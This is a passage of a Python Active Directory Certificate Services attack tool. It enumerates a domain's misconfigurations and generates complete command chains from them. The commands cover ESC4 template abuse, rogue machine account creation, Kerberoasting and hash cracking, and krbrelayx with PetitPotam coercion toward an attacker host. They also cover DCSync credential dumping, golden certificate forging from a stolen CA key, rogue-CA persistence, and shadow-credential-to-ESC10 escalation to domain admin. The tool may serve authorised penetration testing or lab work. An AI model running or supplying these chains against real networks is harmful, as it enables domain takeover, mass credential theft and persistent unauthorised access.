        # ── ESC4 (writable ACL for low-priv) ──
        elif write_acl:
            high(f"ESC4 — Writable template ACL: {tname}",
                 "Low-priv principal has WriteOwner / WriteDACL / FullControl\n"
                 "Can modify template to introduce ESC1 flags then revert",
                 cmds=[
                     f"certipy-ad template -u {user}@{domain} -p {pw_quoted} "
                     f"-dc-ip {dc_ip} -template {tname} -save-old",
                     f"certipy-ad req -u {user}@{domain} -p {pw_quoted} "
                     f"-dc-ip {dc_ip} -ca {ca['name']} "
                     f"-template {tname} -target {ca['dns']} -upn administrator@{domain} -sid {ctx['admin_sid']}",
                     f"certipy-ad auth -pfx administrator.pfx "
                     f"-dc-ip {dc_ip} -domain {domain}",
                     f"# ── DCSync ──",
                     f"export KRB5CCNAME=administrator.ccache",
                     f"impacket-secretsdump -k -no-pass "
                     f"{domain}/administrator@{dc_ip} -just-dc-ntlm",
                     f"# (fallback — use NT hash from certipy auth output)",
                     f"impacket-secretsdump {domain}/administrator@{dc_ip} "
                     f"-hashes <LM:NT_HASH> -just-dc-ntlm",
                     f"# Revert template after exploitation:",
                     f"certipy-ad template -u {user}@{domain} -p {pw_quoted} "
                     f"-dc-ip {dc_ip} -template {tname} -configuration {tname}.json",
                 ])
            template_findings.append(("ESC4", tname))

        # ── ESC2/ESC3 target templates — only shown for low-priv users ──
        elif (not ctx["is_admin"] and not ctx["is_priv"]
              and client_auth and (low_priv_user_enroll or low_priv_comp_enroll)
              and schema == 1 and not enrollee_subj and not any_purpose):
            info(f"ESC2/ESC3 Target — {tname}",
                 f"Client Auth + Schema v1, enrollable by: {', '.join(enrollable)}\n"
                 "Useful as the target template in an ESC2/ESC3 chain\n"
                 "(not exploitable alone — needs a source agent/Any Purpose template)")

    if not template_findings:
        if ctx["is_admin"] or ctx["is_priv"]:
            skip("No additional template misconfigs found — proceed directly to Phase 5 (SubCA endgame)")
        else:
            skip("No exploitable templates found for this user")

    return template_findings


# ─────────────────────────────────────────────────────────────
# PHASE 4 — MAQ
# ─────────────────────────────────────────────────────────────

def phase4_maq(user, password, domain, dc_ip, ctx, ca):
    section("PHASE 4 — MachineAccountQuota & Post-Cert Pivot")

    pw_quoted = _shlex_quote(password)

    # MAQ is a low-priv escalation path — admins already have full control
    if ctx["is_admin"] or ctx["is_priv"]:
        skip("Skipped — not relevant for privileged users (direct paths available in Phase 5)")
        return 0, []

    out = run(
        f"netexec ldap {dc_ip} -u {user} -p {pw_quoted} -M maq 2>/dev/null",
        "Checking MachineAccountQuota"
    )

    m = re.search(r'MachineAccountQuota:\s*(\d+)', out)
    if not m:
        info("Could not determine MachineAccountQuota")
        return 0, []

    maq = int(m.group(1))
    if maq == 0:
        skip("MachineAccountQuota = 0 — cannot create machine accounts as this user")
        return 0, []

    # ── Step 1: Create machine account and get cert + NT hash ──
    med(f"MachineAccountQuota = {maq} — machine account creation available",
        "Create a machine account, enroll in Machine template, obtain NT hash via PKINIT.",
        cmds=[
            f"# ── STEP 1: Create machine account ──",
            f"impacket-addcomputer {domain}/{user}:{pw_quoted} "
            f"-dc-ip {dc_ip} -computer-name 'FAKE$' -computer-pass 'Passw0rd123!'",
            f"python3 {BLOODYADPY} -u {user} -p {pw_quoted} "
            f"-d {domain} --host {dc_ip} set object 'FAKE$' dNSHostName "
            f"-v 'FAKE.{domain}'",
            f"# ── STEP 2: Enroll in Machine template → get cert ──",
            f"certipy-ad req -u 'FAKE$@{domain}' -p 'Passw0rd123!' "
            f"-dc-ip {dc_ip} -ca {ca['name']} -template Machine "
            f"-dns 'FAKE.{domain}'",
            f"# ── STEP 3: Authenticate → get TGT + NT hash ──",
            f"certipy-ad auth -pfx fake.pfx -dc-ip {dc_ip} -domain {domain}",
            f"# Result: fake.ccache (TGT) + NT hash for FAKE$",
        ])

    # ── Step 2: SPN enumeration — Kerberoast opportunity ──
    spn_out = run(
        f"impacket-GetUserSPNs {domain}/{user}:{pw_quoted} "
        f"-dc-ip {dc_ip} 2>/dev/null",
        "Enumerating SPNs (no TGS requested)"
    )

    # Parse SPN output more robustly — handle both table and list formats
    # impacket-GetUserSPNs outputs a table with headers separated by dashes
    spn_accounts = []
    in_table = False
    header_cols = []
    for line in spn_out.split('\n'):
        line_stripped = line.strip()
        if not line_stripped:
            continue
        # Detect the separator line (e.g. "---- ----- --------")
        if re.match(r'^[\-\s]+$', line_stripped) and len(line_stripped) > 10:
            in_table = True
            continue
        if in_table and line_stripped and not line_stripped.startswith('['):
            # Table row — extract SPN (col 0) and account name (col 1)
            parts = line_stripped.split()
            if len(parts) >= 2:
                spn_val = parts[0]
                acct_name = parts[1]
                # Validate: SPN should contain '/', account should not
                if '/' in spn_val and '/' not in acct_name:
                    spn_accounts.append((spn_val, acct_name))

    if spn_accounts:
        acct_names = list(dict.fromkeys(a[1] for a in spn_accounts))
        high(f"Kerberoastable SPNs found — {len(spn_accounts)} SPN(s) across {len(acct_names)} account(s)",
             f"Accounts: {', '.join(acct_names)}\n"
             "Operator choice — request TGS hashes when ready to avoid noise.",
             cmds=[
                 f"# ── Request TGS hashes when ready ──",
                 f"impacket-GetUserSPNs {domain}/{user}:{pw_quoted} "
                 f"-dc-ip {dc_ip} -request -outputfile kerberoast.txt",
                 f"# ── Crack with hashcat ──",
                 f"hashcat -m 13100 kerberoast.txt /usr/share/wordlists/rockyou.txt",
                 f"# ── If privileged account cracked, DCSync directly ──",
                 f"impacket-secretsdump {domain}/<cracked_user>@{dc_ip} -just-dc-ntlm",
             ])
    else:
        skip("No Kerberoastable SPNs found")

    # ── Step 3: Unconstrained delegation + GenericWrite intersection ──
    dc_base = ','.join(f'DC={p}' for p in domain.split('.'))

    deleg_out = run(
        f"impacket-findDelegation {domain}/{user}:{pw_quoted} "
        f"-dc-ip {dc_ip} 2>/dev/null",
        "Enumerating delegation"
    )

    unconstrained = []
    in_deleg_table = False
    for line in deleg_out.split('\n'):
        line_stripped = line.strip()
        if re.match(r'^[\-\s]+$', line_stripped) and len(line_stripped) > 10:
            in_deleg_table = True
            continue
        if in_deleg_table and 'Unconstrained' in line:
            parts = line_stripped.split()
            if parts and parts[0].lower() not in ('accountname', user.lower(), 'fake$'):
                unconstrained.append(parts[0])

    if unconstrained:
        info(f"Unconstrained delegation on: {', '.join(unconstrained)}")
        info("Checking GenericWrite access on unconstrained delegation targets...")

        writable_deleg = []
        for target in unconstrained:
            otype = "COMPUTER" if target.endswith('$') else "USER"
            write_out = run(
                bloodyad_cmd(user, password, domain, dc_ip,
                             f"get writable --otype {otype} "
                             f"--attr servicePrincipalName 2>/dev/null"),
                timeout=20
            )
            # Match on the exact sAMAccountName to avoid partial CN collisions
            t_lower = target.lower().rstrip('$')
            t_exact = target.lower()
            # Look for distinguishedName containing CN=<target> (case-insensitive)
            dn_pattern = re.compile(
                rf'distinguishedName:\s*CN={re.escape(t_lower)}[,$\s]',
                re.IGNORECASE
            )
            if dn_pattern.search(write_out) or f'sAMAccountName: {target}' in write_out:
                writable_deleg.append(target)

        if writable_deleg:
            for target in writable_deleg:
                is_dc = any(kw in target.lower() for kw in ['dc', 'hydra', 'corp'])
                fn = crit if is_dc else high
                fn(f"GenericWrite + Unconstrained Delegation — '{target}' — viable TGT capture",
                   f"Current user has SPN write access on '{target}' which has unconstrained delegation.\n"
                   "This enables the full TGT capture chain without needing DA.\n"
                   "Add SPN to target → DNS record → krbrelayx listener → coerce → capture DC TGT → DCSync.",
                   cmds=[
                       f"# ── Step 1: Add SPN to {target} pointing to Kali ──",
                       f"python3 /opt/krbrelayx/addspn.py "
                       f"-u '{domain}\\{user}' -p {pw_quoted} "
                       f"-t {target} -s 'cifs/attacker.{domain}' {dc_ip}",
                       f"# ── Step 2: Add DNS record pointing to Kali ──",
                       f"python3 /opt/krbrelayx/dnstool.py "
                       f"-u '{domain}\\{user}' -p {pw_quoted} "
                       f"-r attacker.{domain} -a add -d <KALI_IP> {dc_ip}",
                       f"# ── Terminal 1: Start krbrelayx TGT listener ──",
                       f"python3 /opt/krbrelayx/krbrelayx.py "
                       f"--krbsalt '{domain.upper()}{target}' --krbpass {pw_quoted}",
                       f"# ── Terminal 2: Coerce DC authentication via PetitPotam ──",
                       f"python3 /opt/PetitPotam/PetitPotam.py "
                       f"-u '{user}' -p {pw_quoted} -d {domain} <KALI_IP> {dc_ip}",
                       f"# ── Once TGT captured ──",
                       f"export KRB5CCNAME=<dc_hostname>.ccache",
                       f"impacket-secretsdump -k -no-pass "
                       f"{domain}/<dc_hostname>@{dc_ip} -just-dc-ntlm",
                       f"# (fallback — use NT hash from certipy auth output)",
                       f"impacket-secretsdump {domain}/administrator@{dc_ip} "
                       f"-hashes <LM:NT_HASH> -just-dc-ntlm",
                   ])
        else:
            for target in unconstrained:
                is_dc = any(kw in target.lower() for kw in ['dc', 'hydra', 'corp'])
                fn = high if is_dc else info
                fn(f"Unconstrained Delegation — '{target}' (no SPN write access from current position)",
                   f"'{target}' has unconstrained delegation but current user cannot write SPNs to it.\n"
                   "If you gain an account with GenericWrite/SPN write on this object, "
                   "the full TGT capture chain becomes viable.")
    else:
        skip("No unconstrained delegation targets found")

    # ── Step 4: Cleanup ──
    info("Cleanup — remove FAKE$ after exploitation")
    med("Remove FAKE$ machine account after use",
        "Run after exploitation is complete.",
        cmds=[
            f"# ── Remove FAKE$ from the domain ──",
            f"impacket-addcomputer {domain}/{user}:{pw_quoted} "
            f"-dc-ip {dc_ip} -computer-name 'FAKE$' "
            f"-computer-pass 'Passw0rd123!' -delete",
            f"# ── Verify removal ──",
            f"ldapsearch -H ldap://{dc_ip} -D '{user}@{domain}' -w {pw_quoted} "
            f"-b 'CN=Computers,{dc_base}' "
            f"'(sAMAccountName=FAKE$)' sAMAccountName 2>/dev/null | grep -i fake",
        ])

    return maq, list(dict.fromkeys(a[1] for a in spn_accounts)) if spn_accounts else []



# ─────────────────────────────────────────────────────────────
# PHASE 5 — PRIVILEGED ENDGAME (only shown if user is priv/admin)
# ─────────────────────────────────────────────────────────────

def phase5_endgame(user, password, domain, dc_ip, ctx, ca):
    if not (ctx["is_admin"] or ctx["is_priv"]):
        return False

    section("PHASE 5 — Privileged Endgame (available because user is DA/admin)")

    pw_quoted = _shlex_quote(password)

    full_out = certipy_find(user, password, domain, dc_ip, vulnerable=False)

    subca_enrollable = False
    subca_present    = False
    subca_enroll_principals = []

    blocks = _split_certipy_blocks(full_out)
    for block in blocks:
        tname = _certipy_field(block, 'Template Name')
        if not tname or tname != 'SubCA':
            continue
        subca_present = True
        enabled = _certipy_field_bool(block, 'Enabled')

        if not enabled:
            break

        # Extract enrollment rights — handle multiple Certipy output formats
        # Certipy v4: "Enrollment Rights :\n    MARVEL.LOCAL\\Domain Admins"
        # Certipy v5: "Enrollment Rights : MARVEL.LOCAL\\Domain Admins\n ..."
        enroll_m = re.search(
            r'Enrollment Rights\s*:(.*?)(?=Object Control Permissions|Write Owner|Full Control|\n\s*\n|\Z)',
            block, re.DOTALL
        )
        if enroll_m:
            principals_text = enroll_m.group(1)
            # Extract all principal names (DOMAIN\Group or just Group)
            subca_enroll_principals = [
                p.strip() for p in re.findall(
                    r'[A-Za-z0-9\.\-\\]+(?:\s+[A-Za-z]+)*',
                    principals_text
                ) if p.strip() and len(p.strip()) > 2
            ]

        # Check if current user's groups overlap with enrollment principals
        user_groups = ctx.get("groups", []) + [user]
        priv_enroll_groups = ["Domain Admins", "Enterprise Admins", "Administrators"]

        for principal in subca_enroll_principals:
            p_lower = principal.lower()
            if user.lower() in p_lower:
                subca_enrollable = True
                break
            for grp in priv_enroll_groups:
                if grp.lower() in p_lower and grp in ctx.get("groups", []):
                    subca_enrollable = True
                    break
            if subca_enrollable:
                break
        break

    if subca_present and subca_enrollable:
        crit("SubCA — Extract CA Private Key → Golden Cert Persistence (DPERSIST1)",
             "SubCA template confirmed present, enabled, and enrollable.\n"
             "Any Purpose + Enrollment Agent + EnrolleeSuppliesSubject\n"
             "+ Exportable key + No manager approval + No auth signatures required\n"
             "Extracting the CA private key = persistent domain access via forged certs.\n"
             "Golden Certs cannot be revoked as long as the CA certificate is valid.",
             cmds=[
                 f"# ── Get admin SID first ──",
                 f"certipy-ad account -u {user}@{domain} -p {pw_quoted} "
                 f"-dc-ip {dc_ip} -user administrator read",
                 f"# ── Step 1: Request SubCA cert as DA ──",
                 f"certipy-ad req -u {user}@{domain} -p {pw_quoted} "
                 f"-dc-ip {dc_ip} -ca {ca['name']} -target {ca['dns']} -template SubCA "
                 f"-upn administrator@{domain} -sid {ctx['admin_sid']}",
                 f"# ── Step 2: Extract CA private key ──",
                 f"certipy-ad ca -u {user}@{domain} -p {pw_quoted} "
                 f"-dc-ip {dc_ip} -ca {ca['name']} -target {ca['dns']} "
                 f"-config '{ca['dns']}\\{ca['name']}' -backup",
                 f"# ── Step 3: Forge Golden Certificate for any user ──",
                 f"certipy-ad forge -ca-pfx {ca['name']}.pfx "
                 f"-upn administrator@{domain} -sid {ctx['admin_sid']} "
                 f"-crl 'ldap:///' "
                 f"-subject 'CN=Administrator,CN=Users,"
                 f"{','.join(f'DC={p}' for p in domain.split('.'))}'",
                 f"# ── Step 4: Authenticate with forged cert → TGT + NT hash ──",
                 f"certipy-ad auth -pfx administrator_forged.pfx "
                 f"-dc-ip {dc_ip} -domain {domain}",
                 f"# ── Step 5: DCSync using TGT from certipy auth ──",
                 f"export KRB5CCNAME=administrator.ccache",
                 f"impacket-secretsdump -k -no-pass "
                 f"{domain}/administrator@{dc_ip} -just-dc-ntlm",
                 f"# (fallback — use NT hash from certipy auth output)",
                 f"impacket-secretsdump {domain}/administrator@{dc_ip} "
                 f"-hashes <LM:NT_HASH> -just-dc-ntlm",
             ])
    elif subca_present and not subca_enrollable:
        enroll_list = ', '.join(subca_enroll_principals) if subca_enroll_principals else "unknown"
        high("SubCA — present but enrollment denied for current user",
             f"{user} does not have enrollment rights on SubCA.\n"
             f"Enrollment restricted to: {enroll_list}\n"
             "Use ESC7 → SubCA chain as the primary privilege escalation path (Phase 1 commands).")
    else:
        high("SubCA template not found or disabled",
             "SubCA is not available on this CA.\n"
             "ESC7 → SubCA chain is the best available path if ManageCA rights are present.")

    high("DCSync — dump all domain hashes (post DA cert auth)",
         "Once you have administrator.ccache from certipy auth above:",
         cmds=[
             f"# ── Option 1: DCSync using TGT (preferred) ──",
             f"export KRB5CCNAME=administrator.ccache",
             f"impacket-secretsdump -k -no-pass "
             f"{domain}/administrator@{dc_ip} -just-dc-ntlm",
             f"# ── Option 2: DCSync using NT hash (fallback if Kerberos fails) ──",
             f"impacket-secretsdump {domain}/administrator@{dc_ip} "
             f"-hashes <LM:NT_HASH> -just-dc-ntlm",
         ])

    high("PERSIST1/2 — Account Persistence via Certificate Enrollment",
         "With DA access, request long-lived auth certs for user/machine accounts.\n"
         "These certificates persist even after password resets.\n"
         "Cert validity period = persistence window (default 1 year).",
         cmds=[
             f"# ── User persistence (PERSIST1) — enroll auth cert as target user ──",
             f"certipy-ad req -u {user}@{domain} -p {pw_quoted} "
             f"-dc-ip {dc_ip} -ca {ca['name']} -target {ca['dns']} "
             f"-template User -on-behalf-of '{domain.split('.')[0].upper()}\\administrator'",
             f"# ── Machine persistence (PERSIST2) — enroll Machine cert ──",
             f"certipy-ad req -u {user}@{domain} -p {pw_quoted} "
             f"-dc-ip {dc_ip} -ca {ca['name']} -target {ca['dns']} "
             f"-template Machine",
             f"# ── Authenticate later using saved cert (survives password resets) ──",
             f"certipy-ad auth -pfx administrator.pfx -dc-ip {dc_ip} -domain {domain}",
         ])

    high("DPERSIST2 — Rogue CA Certificate in NTAuthCertificates",
         "Add a self-signed CA cert to NTAuthCertificates → forge certs from offline CA.\n"
         "More stealthy than stealing the real CA key — uses a separate rogue CA.\n"
         "Persists until the rogue cert is manually removed from the NTAuth store.",
         cmds=[
             f"# ── Step 1: Generate a rogue CA cert ──",
             f"certipy-ad ca -u {user}@{domain} -p {pw_quoted} "
             f"-dc-ip {dc_ip} -ca {ca['name']} -target {ca['dns']} -backup",
             f"# ── Step 2: Add rogue CA to NTAuthCertificates (requires DA) ──",
             f"# certutil -dspublish -f rogue-ca.crt NTAuthCA",
             f"# ── Step 3: Forge certs signed by rogue CA ──",
             f"certipy-ad forge -ca-pfx rogue-ca.pfx "
             f"-upn administrator@{domain} -sid {ctx['admin_sid']} -crl 'ldap:///'",
             f"certipy-ad auth -pfx administrator_forged.pfx "
             f"-dc-ip {dc_ip} -domain {domain}",
         ])

    return subca_enrollable


# ─────────────────────────────────────────────────────────────
# PHASE 6 — SHADOW CREDENTIALS
# ─────────────────────────────────────────────────────────────

def phase6_shadow_credentials(user, password, domain, dc_ip, ctx, ca):
    section("PHASE 6 — Shadow Credentials (ADCS-chained GenericWrite check)")

    pw_quoted = _shlex_quote(password)
    dc_base = ','.join(f'DC={p}' for p in domain.split('.'))

    REDUNDANT_FOR_PRIV = {
        'administrator', 'krbtgt',
    }

    dc_machine_names = set()
    hosts_out = run(f"grep -i '{dc_ip}' /etc/hosts 2>/dev/null")
    for match in re.finditer(r'\d+\.\d+\.\d+\.\d+\s+([\w\.\-]+)', hosts_out):
        hostname = match.group(1).split('.')[0].lower()
        if hostname:
            dc_machine_names.add(f"{hostname}$")
            dc_machine_names.add(hostname)
    REDUNDANT_FOR_PRIV.update(dc_machine_names)

    # Enumerate all users and computers
    users_out = run(
        f"ldapsearch -H ldap://{dc_ip} "
        f"-D '{user}@{domain}' -w {pw_quoted} "
        f"-b '{dc_base}' "
        f"'(|(objectClass=user)(objectClass=computer))' sAMAccountName 2>/dev/null",
        "Enumerating all domain users and computers"
    )

    targets = []
    for match in re.finditer(r'^sAMAccountName:\s*(.+)$', users_out, re.MULTILINE):
        name = match.group(1).strip()
        if name.lower() in {'guest', 'defaultaccount', 'wdagutilityaccount'}:
            continue
        if name.lower().rstrip('$') == user.lower() or name.lower() == user.lower():
            continue
        if (ctx["is_admin"] or ctx["is_priv"]) and name.lower().rstrip('$') in REDUNDANT_FOR_PRIV:
            continue
        targets.append(name)

    if not targets:
        if ctx["is_admin"] or ctx["is_priv"]:
            skip("No additional targets beyond Phase 5 endgame — shadow creds not needed")
        else:
            skip("Could not enumerate domain objects — skipping shadow credentials check")
        return []

    display_targets = targets[:10]
    extra = len(targets) - 10
    info(f"Checking {len(targets)} target(s)" +
         (" (HVTs filtered — covered by Phase 5)" if ctx["is_admin"] or ctx["is_priv"] else ""),
         '\n'.join(display_targets) +
         (f'\n... and {extra} more' if extra > 0 else ''))

    info(f"Checking msDS-KeyCredentialLink write access on {len(targets)} target(s)...")

    shadow_hits = []
    for target in targets:
        t_lower = target.lower()
        t_base  = t_lower.rstrip('$')

        check_out = run(
            bloodyad_cmd(user, password, domain, dc_ip,
                         f"get writable --otype {'COMPUTER' if target.endswith('$') else 'USER'} "
                         f"--attr msDS-KeyCredentialLink 2>/dev/null"),
            timeout=20
        )

        # Match on exact CN or sAMAccountName to avoid partial collisions
        # e.g. "dan" should not match "danielle"
        target_mentioned = False
        # Check distinguishedName for exact CN match
        dn_pattern = re.compile(
            rf'distinguishedName:\s*CN={re.escape(target.rstrip("$"))}[,$\s]',
            re.IGNORECASE
        )
        if dn_pattern.search(check_out):
            target_mentioned = True
        # Also check sAMAccountName for exact match
        sam_pattern = re.compile(
            rf'^sAMAccountName:\s*{re.escape(target)}\s*$',
            re.MULTILINE | re.IGNORECASE
        )
        if sam_pattern.search(check_out):
            target_mentioned = True

        attr_mentioned = 'msds-keycredentiallink' in check_out.lower() or 'keycredentiallink' in check_out.lower()

        if not (target_mentioned and attr_mentioned):
            continue

        shadow_hits.append(target)
        is_machine = target.endswith('$')
        is_hvt = any(hvt in t_lower for hvt in
                     ['administrator', 'krbtgt', 'dc$', 'domain admin'])
        fn = crit if is_hvt else high
        note = ("\nNote: target is a machine account — "
                "useful for NT hash retrieval, not direct DA") if is_machine else ""
        fn(f"Shadow Credentials — write access on '{target}'",
           f"{user} can write msDS-KeyCredentialLink on '{target}'\n"
           f"Authenticate as target via PKINIT without knowing their password.{note}\n"
           f"{'Directly exploitable path.' if is_hvt else 'Use as pivot or ESC10 chain component.'}",
           cmds=[
               f"# Full auto chain — writes key credential, authenticates, removes key",
               f"certipy-ad shadow auto -u {user}@{domain} -p {pw_quoted} "
               f"-dc-ip {dc_ip} -account {target}",
               f"# Authenticate with resulting cert:",
               f"certipy-ad auth -pfx {t_base}.pfx "
               f"-dc-ip {dc_ip} -domain {domain}",
           ])

    # ── Merge graph-discovered targets with AddKeyCredentialLink/GenericWrite/GenericAll ──
    # If graph analysis found accounts we can write KeyCredentialLink on (via multi-hop ACL),
    # add them as shadow_hits candidates even if bloodyAD didn't detect them.
    graph_results = ctx.get("graph_results")
    if graph_results and not shadow_hits:
        graph_shadow_candidates = []
        for w in (graph_results.get("writable_users", []) +
                  graph_results.get("writable_computers", [])):
            edge = w.get("edge", "")
            if edge in ("AddKeyCredentialLink", "GenericAll", "GenericWrite"):
                target_name = w["target"]
                if "@" in target_name:
                    target_name = target_name.split("@")[0]
                if "." in target_name and not target_name.endswith("$"):
                    target_name = target_name.split(".")[0] + "$"
                if target_name.lower().rstrip('$') == user.lower():
                    continue
                graph_shadow_candidates.append(target_name)

        graph_shadow_candidates = list(dict.fromkeys(graph_shadow_candidates))
        if graph_shadow_candidates:
            info(f"Graph analysis suggests shadow creds may be viable on {len(graph_shadow_candidates)} target(s)",
                 "These were discovered via multi-hop ACL paths (not verified by bloodyAD).\n"
                 "Manual verification recommended before exploitation.\n"
                 + '\n'.join(graph_shadow_candidates))
            for target in graph_shadow_candidates:
                t_base = target.lower().rstrip('$')
                med(f"Shadow Credentials (graph-inferred) — '{target}'",
                    f"Graph analysis found a write path to '{target}' via ACL chain.\n"
                    "Verify with: bloodyAD get writable --otype USER --attr msDS-KeyCredentialLink\n"
                    "If confirmed, exploit with certipy shadow auto.",
                    cmds=[
                        f"certipy-ad shadow auto -u {user}@{domain} -p {pw_quoted} "
                        f"-dc-ip {dc_ip} -account {target}",
                        f"certipy-ad auth -pfx {t_base}.pfx "
                        f"-dc-ip {dc_ip} -domain {domain}",
                    ])
            # Don't add to shadow_hits directly — they're unverified
            # But flag them for the summary
            ctx["graph_shadow_candidates"] = graph_shadow_candidates

    if not shadow_hits:
        skip(f"No write access to msDS-KeyCredentialLink found for {user} "
             f"on {'remaining' if ctx['is_admin'] or ctx['is_priv'] else 'any'} targets")
    else:
        info(f"Shadow credentials viable against {len(shadow_hits)} object(s)",
             '\n'.join(shadow_hits))

    return shadow_hits


# ─────────────────────────────────────────────────────────────
# CHAIN RESOLVER
# ─────────────────────────────────────────────────────────────

def resolve_chains(user, password, domain, dc_ip, ca,
                   binding, esc10_targets, shadow_hits):
    """
    Cross-references Phase 2 (ESC10 conditions) and Phase 6 (GenericWrite targets)
    to identify complete exploitable chains.
    """
    chains = []
    pw_quoted = _shlex_quote(password)

    if binding > 1 or not shadow_hits:
        return chains

    for target in shadow_hits:
        template = "User"

        chain = {
            "target": target,
            "is_machine": target.endswith('$'),
            "steps": [
                f"# ── STEP 1: Shadow Credentials → get NT hash for '{target}' ──",
                f"certipy-ad shadow auto -u {user}@{domain} -p {pw_quoted} "
                f"-dc-ip {dc_ip} -account {target}",
                f"# Result: {target.lower().rstrip('$')}.pfx + NT hash — note the hash output",
                f"# ── STEP 2: Set '{target}' UPN to impersonate administrator ──",
                f"python3 {BLOODYADPY} -u {user} -p {pw_quoted} "
                f"-d {domain} --host {dc_ip} "
                f"set object '{target}' userPrincipalName -v 'administrator'",
                f"# ── STEP 3: Request cert as '{target}' using NT hash (UPN = administrator) ──",
                f"certipy-ad req -u {target}@{domain} "
                f"-hashes :<NT_HASH_FROM_STEP_1> "
                f"-dc-ip {dc_ip} -ca {ca['name']} -template {template}",
                f"# ── STEP 4: Restore original UPN (cleanup) ──",
                f"python3 {BLOODYADPY} -u {user} -p {pw_quoted} "
                f"-d {domain} --host {dc_ip} "
                f"set object '{target}' userPrincipalName "
                f"-v '{target}@{domain}'",
                f"# ── STEP 5: Authenticate with cert → DA access ──",
                f"certipy-ad auth -pfx administrator.pfx "
                f"-dc-ip {dc_ip} -domain {domain} -username administrator",
                f"# ── STEP 6: DCSync ──",
                f"export KRB5CCNAME=administrator.ccache",
                f"impacket-secretsdump -k -no-pass "
                f"{domain}/administrator@{dc_ip} -just-dc-ntlm",
                f"# (fallback — use NT hash from certipy auth output)",
                f"impacket-secretsdump {domain}/administrator@{dc_ip} "
                f"-hashes <LM:NT_HASH> -just-dc-ntlm",
            ]
        }
        chains.append(chain)

    return chains


def display_chains(chains):
    if not chains:
        return

    section("CHAIN ANALYSIS — Shadow Credentials → ESC10 → DA")

    for i, chain in enumerate(chains, 1):
        target = chain["target"]
        crit(f"Chain {i}: Shadow Creds on '{target}' → ESC10 → DA",
             f"Complete no-password chain (5 steps):\n"
             f"  Phase 6 (Shadow Creds) unlocks Phase 2 (ESC10)\n"
             f"  GenericWrite on '{target}' → NT hash → cert with DA UPN → DA",
             cmds=chain["steps"])




def print_summary(user, ctx, ca_findings, template_findings, maq, binding, shadow_hits=None, esc10_targets=None, chains=None, subca_enrollable=False, kerberoast_accounts=None, graph_results=None):
    section("ATTACK PATH SUMMARY")

    tier1, tier2, tier3 = [], [], []

    # ── Graph analysis findings (highest priority — full path visibility) ──
    if graph_results:
        for dp in graph_results.get("da_paths", []):
            if dp["hops"] <= 2:
                tier1.append(f"Graph: {dp['hops']}-hop path to DA — {dp['path']}")
            else:
                tier2.append(f"Graph: {dp['hops']}-hop path to DA — {dp['path']}")
        for dsp in graph_results.get("dcsync_paths", []):
            tier1.append(f"Graph: DCSync path ({dsp['hops']} hops) — {' → '.join(dsp['nodes'])}")
        # Writable targets from graph that aren't covered by other phases
        graph_users = graph_results.get("writable_users", [])
        graph_comps = graph_results.get("writable_computers", [])
        for w in graph_users[:5]:  # Cap to avoid flooding
            via_str = "direct" if w["hops"] <= 1 else f"via {w['via']} ({w['hops']} hops)"
            tier2.append(f"Graph: {w['edge']} on '{w['target']}' ({via_str})")
        for w in graph_comps[:5]:
            via_str = "direct" if w["hops"] <= 1 else f"via {w['via']} ({w['hops']} hops)"
            tier2.append(f"Graph: {w['edge']} on '{w['target']}' ({via_str})")

    # Tier 1 — direct DA
    if ctx["is_admin"] or ctx["is_priv"]:
        if subca_enrollable:
            tier1.append("SubCA endgame available — extract CA private key → forge certs → persistent DA (Phase 5)")
        elif "ESC7" in ca_findings:
            tier1.append("ESC7 → SubCA chain → force-issue cert as DA (Phase 1 commands)")
        else:
            tier1.append("User is DA/admin — use ESC7 or other CA-level paths (Phase 1)")
    if "ESC6" in ca_findings:
        tier1.append("ESC6 — SAN already enabled → request cert as any user now")
    if "ESC13" in ca_findings:
        tier1.append("ESC13 — enroll in linked template → gain privileged group membership")
    if "ESC15" in ca_findings:
        tier1.append("ESC15 — Schema v1 template with EKU override → request cert with Client Auth + DA UPN")
    for esc, tname in template_findings:
        if esc == "ESC1":
            tier1.append(f"ESC1 via {tname} — request cert with DA UPN directly")
        if esc == "ESC1-PRIV":
            tier1.append(f"ESC1 (priv) via {tname} — accessible due to privileged group membership")
    for chain in (chains or []):
        tier1.append(
            f"Shadow Creds → ESC10 via '{chain['target']}' — "
            f"complete no-password chain → DA (see Chain Analysis)"
        )
    for target in (shadow_hits or []):
        is_machine = target.endswith('$')
        is_hvt = any(hvt in target.lower() for hvt in
                     ['administrator', 'krbtgt', 'frankcastle', 'adm.'])
        already_chained = any(c["target"] == target for c in (chains or []))
        if already_chained:
            continue
        if is_hvt:
            tier1.append(f"Shadow Credentials on '{target}' — direct privileged access")
        elif is_machine:
            tier3.append(f"Shadow Credentials on '{target}' — machine cert → NT hash → pivot")
        else:
            tier2.append(f"Shadow Credentials on '{target}' — cert auth as user → further pivot")

    # Tier 2 — require chain or relay
    for esc, tname in template_findings:
        if esc == "ESC2":
            tier2.append(f"ESC2 via {tname} — use as agent → enroll on behalf of DA")
        if esc == "ESC3":
            tier2.append(f"ESC3 via {tname} — enrollment agent chain → DA cert")
        if esc == "ESC4":
            tier2.append(f"ESC4 via {tname} — modify template ACL → ESC1 → DA cert")
    if "ESC8" in ca_findings:
        tier2.append("ESC8 — relay to web enrollment → DC cert → PKINIT")
    if "ESC11" in ca_findings:
        tier2.append("ESC11 — relay to RPC enrollment → DC cert")
    for acct in list(dict.fromkeys(kerberoast_accounts or [])):
        tier2.append(f"Kerberoast available — '{acct}' has SPN → request TGS hash → crack → potential DA")

    # Tier 3 — pivot / partial (only relevant for low-priv users)
    if not (ctx["is_admin"] or ctx["is_priv"]):
        if maq > 0:
            tier3.append("MAQ > 0 — create machine account → Machine cert → NT hash → pivot")
        if esc10_targets and not chains:
            for t in esc10_targets:
                tier2.append(f"ESC10 partial — '{t}' writable but need target creds for Step 3")
        elif binding <= 1 and not esc10_targets and not chains:
            tier3.append("Weak certificate binding (registry absent) — ESC9/10 viable if UPN write access is gained")

    if not any([tier1, tier2, tier3]):
        _print(f"\n  {DIM}No direct ADCS attack paths available for {user}.{RST}")
        _print(f"  {DIM}Recommend: enumerate ACLs (bloodyAD), Kerberoast, or escalate to a higher-priv account.{RST}")
        return

    if tier1:
        _print(f"\n  {R}{BOLD}TIER 1 — Direct DA (execute now):{RST}")
        for i, p in enumerate(tier1, 1):
            _print(f"    {R}{i}.{RST} {p}")

    if tier2:
        _print(f"\n  {Y}{BOLD}TIER 2 — Chained / Relay (requires extra steps):{RST}")
        for i, p in enumerate(tier2, 1):
            _print(f"    {Y}{i}.{RST} {p}")

    if tier3:
        _print(f"\n  {C}{BOLD}TIER 3 — Pivot / Partial (useful for escalation):{RST}")
        for i, p in enumerate(tier3, 1):
            _print(f"    {C}{i}.{RST} {p}")

